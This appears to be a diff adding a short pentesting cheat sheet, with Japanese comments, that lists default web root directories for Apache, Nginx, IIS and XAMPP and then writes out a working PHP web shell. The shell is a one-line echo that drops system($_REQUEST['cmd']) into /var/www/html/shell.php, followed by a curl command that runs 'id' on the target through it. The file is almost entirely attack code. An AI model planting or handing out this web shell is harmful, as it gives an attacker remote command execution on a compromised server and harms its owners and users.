@@ -1,1 +1,9 @@
+//各OSでのwebルート
+Apache	/var/www/html/
+Nginx	/usr/local/nginx/html/
+IIS	c:\inetpub\wwwroot\
+XAMPP	C:\xampp\htdocs\
 
+//webシェルの書き込み
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+curl http://SERVER_IP:PORT/shell.php?cmd=id　#webシェルへのコマンド実行
